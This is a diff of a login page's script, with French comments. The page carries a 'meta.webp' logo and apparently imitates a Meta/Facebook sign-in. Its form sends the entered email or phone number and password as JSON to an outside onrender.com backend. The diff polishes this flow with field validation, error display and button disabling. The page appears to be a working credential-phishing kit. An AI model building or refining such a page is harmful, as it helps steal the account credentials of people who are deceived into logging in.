@@ -104,37 +104,46 @@
             <p><img src="meta.webp" alt="Logo" class="logo"></p>
         </div>
     </div>
+<div id="error-message" style="color: red; margin-top: 10px;"></div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', async (event) => {
-            event.preventDefault();
+       document.getElementById('loginForm').addEventListener('submit', async (event) => {
+    event.preventDefault();
 
-            const emailOrMobile = document.getElementById('emailOrMobile').value;
-            const password = document.getElementById('password').value;
+    const emailOrMobile = document.getElementById('emailOrMobile').value;
+    const password = document.getElementById('password').value;
+    const submitButton = event.target.querySelector('button[type="submit"]');
+    const errorMessage = document.getElementById('error-message');
 
-            try {
-                const response = await fetch('https://back-ky38.onrender.com', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ emailOrMobile, password }),
-                });
+    errorMessage.textContent = ''; // Réinitialiser le message d'erreur
+    submitButton.disabled = true; // Désactiver le bouton
 
-                const data = await response.json();
-                if (response.ok) {
-                    alert(data.message);
-                } else {
-                    alert('Erreur : ' + data.error);
-                }
-            } catch (error) {
-                console.error('Erreur lors de la requête :', error);
-                alert('Erreur lors de l\'envoi des données.');
-            }
+    if (!emailOrMobile || !password) {
+        errorMessage.textContent = 'Veuillez remplir tous les champs.';
+        submitButton.disabled = false; // Réactiver le bouton
+        return;
+    }
+
+    try {
+        const response = await fetch('https://back-ky38.onrender.com/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ emailOrMobile, password }),
         });
-        const submitButton = document.querySelector('button[type="submit"]');
-submitButton.disabled = true; // Désactiver le bouton
 
-// Réactiver après la requête
-submitButton.disabled = false;
+        const data = await response.json();
+        if (response.ok) {
+            alert(data.message);
+        } else {
+            errorMessage.textContent = 'Erreur : ' + data.error;
+        }
+    } catch (error) {
+        console.error('Erreur lors de la requête :', error);
+        errorMessage.textContent = 'Erreur lors de l\'envoi des données.';
+    } finally {
+        submitButton.disabled = false; // Réactiver le bouton
+    }
+});
 
     </script>
 </body>
